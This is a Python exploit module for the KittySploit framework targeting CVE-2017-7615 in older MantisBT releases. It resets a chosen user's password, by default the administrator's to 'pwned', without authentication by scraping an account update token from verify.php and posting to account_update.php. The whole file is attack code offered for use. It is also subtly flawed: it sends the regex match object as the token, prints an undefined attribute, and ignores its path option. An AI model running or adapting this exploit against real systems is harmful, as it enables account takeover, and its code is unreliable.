from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re

class Module(Auxiliary, Http_client):

	__info__ = {
		"name": "MantisBT password reset",
		"description": "MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.",
		"author": "KittySploit Team",
		"cve": "2017-7615",
	}

	userid = OptString("1", "User id to reset", "yes")
	realname = OptString("administrator", "Realname", "yes")
	newpassword = OptString("pwned", "New password to set", "yes")
	uripath = OptString("/mantisbt-2.3.0", "Path to login page", "yes")

	def run(self):
		r = self.http_request(
						method = "GET",
						path = f"/verify.php?id={self.userid}&confirm_hash",
						session = True
						)
		if not r:
			fail.NotVulnerable()
			return False
		token =  re.search(r'<input type="hidden" name="account_update_token" value="([a-zA-Z0-9_-]+)"', r.text, re.I)
		if not token:
			fail.NotVulnerable()
			return False
		post_data = {"verify_user_id" : self.userid,
					"account_update_token": token,
					"realname": self.realname,
					"password": self.newpassword,
					"password_confirm": self.newpassword,
					}
		
		pwn = self.http_request(
						method = "POST",
						path = "/account_update.php",
						data = post_data,
						session = True
						)
		if not pwn:
			fail.NotVulnerable()	
			return False
		if 'Password successfully updated' in pwn.text:
			print_success(f"Password successfully changed to {self.password}.")
			Vulnerable.SUCCESS()
			return True
		else:
			fail.NotVulnerable()
			return False
